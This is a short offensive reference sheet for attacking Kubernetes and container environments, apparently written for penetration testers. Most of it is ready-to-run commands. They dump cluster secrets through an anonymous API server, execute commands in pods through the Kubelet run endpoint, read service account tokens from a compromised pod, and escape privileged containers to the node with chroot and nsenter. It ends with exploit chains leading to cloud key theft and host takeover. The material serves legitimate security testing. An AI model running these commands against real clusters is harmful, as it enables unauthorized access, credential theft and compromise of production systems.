# Kubernetes & Container Security Reference

## Attack Surface Signals
- **Ports**: `6443` (Kubernetes API Server), `10250` (Kubelet authenticated), `10255` (Kubelet read-only), `2379`/`2380` (etcd), `8443` (Minikube/Dashboard).
- **Service Account Tokens**: `/var/run/secrets/kubernetes.io/serviceaccount/token` inside pods.

## Testing & Exploitation Methodology
1. **Unauthenticated / Anonymous API Server Access**:
   - `curl -k https://target:6443/api/v1/namespaces`
   - `curl -k https://target:6443/api/v1/namespaces/default/secrets`
   - `kubectl --server=https://target:6443 --insecure-skip-tls-verify get pods`
2. **Kubelet Exploitation (Port 10250 / 10255)**:
   - Check unauthenticated pod listing: `curl -k https://target:10250/pods` or `http://target:10255/pods`.
   - Execute commands in running pod container via Kubelet API:
     `curl -k -X POST "https://target:10250/run/{namespace}/{pod}/{container}" -d "cmd=id"`
3. **Pod Service Account Token Abuse**:
   - Extract JWT from inside compromised container:
     `TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)`
     `curl -k -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces/default/pods`
   - Test RBAC permissions: `kubectl auth can-i create pods --token=$TOKEN`.
4. **Privileged Pod Container Escape**:
   - Check if pod runs as `--privileged` or mounts host root filesystem:
     `chroot /host /bin/bash`
     `nsenter -t 1 -m -u -i -n /bin/bash`

## Exploit Chains
- **Anonymous K8s API Access → Namespace Secret Dump → Cloud Provider Service Account Key Extraction**.
- **Kubelet Run Endpoint Access → Command Execution in Production Container → Container Escape to Node Host**.
